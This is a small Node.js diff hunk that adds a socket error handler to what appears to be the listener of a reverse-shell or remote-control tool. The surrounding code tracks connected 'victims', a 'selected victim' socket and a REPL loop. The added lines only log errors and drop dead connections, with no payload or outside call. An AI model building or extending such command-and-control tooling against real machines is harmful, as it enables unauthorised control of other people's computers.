@@ -133,6 +133,17 @@ net.createServer(function(socket){
         continueRepl();
     });
 
+    // error
+    socket.on("error", function(err){
+        console.log("Socket Error Caught");
+        console.log(err);
+        console.log("Disconnect this socket: " + socket.name);
+        if (socket === current_socket){
+            current_socket = null; // no selected victim.
+        }
+        victims.splice(victims.indexOf(socket), 1);
+    });
+
     // victim disconnect
     socket.on("end", function(){
         if (socket === current_socket){
